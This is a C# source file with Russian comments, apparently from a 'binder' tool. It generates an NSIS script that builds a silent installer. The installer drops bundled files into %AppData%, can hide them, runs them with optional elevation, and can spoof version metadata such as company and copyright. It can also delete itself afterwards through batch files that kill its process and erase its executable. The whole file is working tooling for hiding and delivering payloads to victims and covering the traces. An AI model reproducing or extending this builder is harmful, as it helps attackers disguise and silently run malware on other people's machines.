namespace R3BinderTools.Compilation.NSIS
{
    using System.IO;
    using System.Text;

    public static class ScriptGen
    {
        // https://www.itlnet.net/programming/program/nsis/makensis.htm

        /// <summary>
        /// Генератор скрипта для компиляции билд файла
        /// </summary>
        /// <param name="nsi">Данные скрипта</param>
        public static void Inizialize(NsiBuild nsi)
        {
            var script = new StringBuilder();

            script.AppendLine("Unicode True"); // Правильно отображать все языки
            script.AppendLine("SilentInstall silent"); // Скрытый режим установки
            if (nsi.CheckAdmin.Checked) // Проверка установки для запуска от имени Администратора
            {
                script.AppendLine("RequestExecutionLevel admin"); // Запуск от Админ прав
            }
            if (nsi.CheckIcon.Checked) // Проверка установки иконки для билд файла
            {
                script.AppendLine($"Icon \"{nsi.IconPath}\""); // Полный путь к иконки файла
            }
            script.AppendLine($"OutFile \"{nsi.BuildName}.exe\""); // Выходной файл сгенерированного билда
            script.AppendLine("SetCompressor /FINAL /SOLID lzma"); // Компрессия для билд файла
            script.AppendLine("SetDatablockOptimize ON"); // Оптимизация блоков
            script.AppendLine("");
            if (nsi.PropetiesBuild.Checked) // Проверка установки свойств для билд файла
            {
                script.AppendLine($"VIProductVersion \"{nsi.VIFileVersion}\"");
                script.AppendLine($"VIAddVersionKey ProductName \"{nsi.VIProductName}\"");
                script.AppendLine($"VIAddVersionKey ProductVersion {nsi.VIProductVersion}");
                script.AppendLine($"VIAddVersionKey FileVersion {nsi.VIFileVersion}");
                script.AppendLine($"VIAddVersionKey CompanyName \"{nsi.VICompanyName}\"");
                script.AppendLine($"VIAddVersionKey Comments \"{nsi.VIDescriptionName}\"");
                script.AppendLine($"VIAddVersionKey LegalCopyright \"{nsi.VICopyright}\"");
                script.AppendLine($"VIAddVersionKey FileDescription \"{nsi.VIFileDescription}\"");
                script.AppendLine($"VIAddVersionKey LegalTrademarks \"{nsi.VILegalTrademarks}\"");
                script.AppendLine($"VIAddVersionKey OriginalFilename \"{nsi.BuildName}.exe\"");
                script.AppendLine("");
            }
            if (nsi.SpisokFiles.Items.Count > 0) // Проверка файлов в списке ( на всякий случай )
            {
                for (int i = 0; i < nsi.SpisokFiles.Items.Count; i++) // Перебираем все элементы в ListBox
                {
                    script.AppendLine($"Section \"file{i}\""); // Секция для файла
                    script.AppendLine("SetOutPath \"$AppData\""); // Установка выходного пути
                    script.AppendLine("SetOverwrite on"); // Перезаписывать файл
                    script.AppendLine($"File \"{nsi.SpisokFiles.Items[i]}\""); // Имя файла
                    if (nsi.CheckIsHideFiles.Checked) // Проверка на установку скрытия файлов после распаковки
                    {
                        script.AppendLine($"SetFileAttributes \"$AppData\\{Path.GetFileName(nsi.SpisokFiles.Items[i].ToString())}\" hidden"); // Скрываем файл
                    }
                    if (nsi.CheckIsAdminRunFiles.Checked)
                    {
                        script.AppendLine($"ExecShell \"runas\" \"$AppData\\{Path.GetFileName(nsi.SpisokFiles.Items[i].ToString())}\""); // Запуск файл(ов)а в папке
                    }
                    else
                    {
                        script.AppendLine($"Exec \"$AppData\\{Path.GetFileName(nsi.SpisokFiles.Items[i].ToString())}\""); // Запуск файл(ов)а в папке
                    }
                    script.AppendLine("SectionEnd"); // Конец секции для записи
                    script.AppendLine("");
                }
            }
            if (nsi.CheckSuicide.Checked) // Проверка установки самоудаления билда
            {
                script.AppendLine("; Создаём скрипт для удаления билд файла");
                script.AppendLine("Section"); // Новая секция для записи
                script.AppendLine("FileOpen $0 \"selfdelete.bat\" w"); // Имя нового файла
                script.AppendLine(@"FileWrite $0 '@echo off$\r$\n'"); // Запись без показа сообщения вывода
                script.AppendLine(@"FileWrite $0 ':loop$\r$\n'"); // Создаём цикл
                script.AppendLine($@"FileWrite $0 'del $EXEPATH$\r$\n'"); // Удаляем файл запуска приложения
                script.AppendLine($@"FileWrite $0 'if Exist $EXEPATH GOTO loop$\r$\n'"); // Проверяем файл в цикле
                script.AppendLine(@"FileWrite $0 'del %0$\r$\n'"); // Удаляем .bat файл после использования
                script.AppendLine("FileClose $0"); // Освобождаем ресурс файла
                script.AppendLine("Pop $0"); 
                script.AppendLine("SectionEnd"); // Конец записи в секцию
                script.AppendLine("");

                script.AppendLine("; Создаём скрипт для проверки процесса и его завершения, затем запускаем скрипт для удаления билд файла");
                script.AppendLine("Section"); // Новая секция для записи
                script.AppendLine("FileOpen $0 \"helper.bat\" w"); // Имя нового файла
                script.AppendLine(@"FileWrite $0 '@echo off$\r$\n'"); // Запись без показа сообщения вывода
                script.AppendLine($@"FileWrite $0 'taskkill /f /im $EXEFILE$\r$\n'"); // Убиваем процесс билд файла
                script.AppendLine(@"FileWrite $0 'CALL selfdelete.bat$\r$\n'"); // Вызываем скрипт для удаления билд файла
                script.AppendLine(@"FileWrite $0 'del %0$\r$\n'"); // Удаляем .bat файл после использования
                script.AppendLine("FileClose $0"); // Освобождаем ресурс файла
                script.AppendLine("Pop $0"); 
                script.AppendLine("SectionEnd"); // Конец записи в секцию
                script.AppendLine("");

                script.AppendLine("Function .onInstSuccess"); // Установка функции по завершению всех действий с секциями
                script.AppendLine("nsExec::Exec \"$AppData\\helper.bat\" SW_HIDE"); // Запускаем .bat файл для выполнения всех действий с билд файлом.
                script.AppendLine("FunctionEnd"); // Конец функции
            }

            // Записываем все данные в файл с кодировкой UTF-8 ( чтобы избежать ошибок с кириллицей. )
            try
            {
                File.WriteAllText(Helpers.GlobalPath.ScriptPath, script?.ToString(), Encoding.UTF8);
            }
            catch { }
        }
    }
}